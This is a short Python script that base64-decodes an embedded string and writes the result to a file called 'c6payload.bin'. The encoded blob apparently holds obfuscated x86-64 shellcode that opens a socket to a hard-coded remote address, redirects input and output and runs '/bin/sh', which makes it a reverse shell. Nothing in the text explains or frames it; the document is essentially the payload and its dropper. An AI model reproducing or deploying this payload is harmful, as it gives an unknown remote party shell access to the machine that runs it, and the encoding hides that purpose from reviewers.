import base64

s = "SIn46AAAAABIixwkSIPDCusKSDHSSDHAsDwPBcAI8oA4G3QC/+NIg8ABgDBAgDDygDCzgDgwdAL/40iDwAGAMHGAOB90Av/jSIPAAYAAo8AIvIA4sHQC/+NIg8ABgCh5gDjodAL/40iDwAHACIKAKCiAOPZ0Av/jSIPAAYAosMAITYAALIA4H3QC/+NIg8ABgABUwACZgDC4wAgqgAA/gDivdAL/40iDwAHACLqAOF10Av/jSIPAAYAw7cAIbIAAMIA4KXQC/+NIg8ABgCi/gDi1dAL/40iDwAHAALyAAIzAAHuAKDGAAGOAOKV0Av/jSIPAAcAAIMAAFoAwrsAAmIA483QC/+NIg8ABwAhugADSgDimdAL/40iDwAGAADSAOGJ0Av/jSIPAAYAAzYAoEIAAYoAwsoA4MnQC/+NIg8ABgDC3gDBzwAgHgDjrdAL/40iDwAGAADSAKGHACDaAAFuAKEyAOAt0Av/jSIPAAYAAWoA4mnQC/+NIg8ABwAiigDiZdAL/40iDwAGAMH6AKOeAOCt0Av/jSIPAAYAouIAwhoAATsAISsAAV4A4r3QC/+NIg8ABwAiGgDDowACVgDBKgDCtgDjDdAL/40iDwAHACEWAMMyAAByAOAN0Av/jSIPAAYAoSoA443QC/+NIg8ABgDClwAiQgDjKdAL/40iDwAHACN7AADaAMHiAKNiAOD50Av/jSIPAAYAAtYAorcAIicAAosAAEYA42HQC/+NIg8ABgABAgCghwAjAgDiCdAL/40iDwAHAAOOAOHt0Av/jSIPAAYAoeMAI9oA413QC/+NIg8ABSDHASDH/SDH2SDHSTTHAagJfagFeagZaailYDwVJicBIMfZNMdJBUsYEJAJmx0QkApoCx0QkBAkeS1ZIieZqEFpBUF9qKlgPBUgx9moDXkj/zmohWA8FdfZIMf9XV15aSL8vL2Jpbi9zaEjB7whXVF9qO1gPBZDr/pA="

s_decode = base64.b64decode(s)

f = open("c6payload.bin", "wb")
f.write(s_decode)
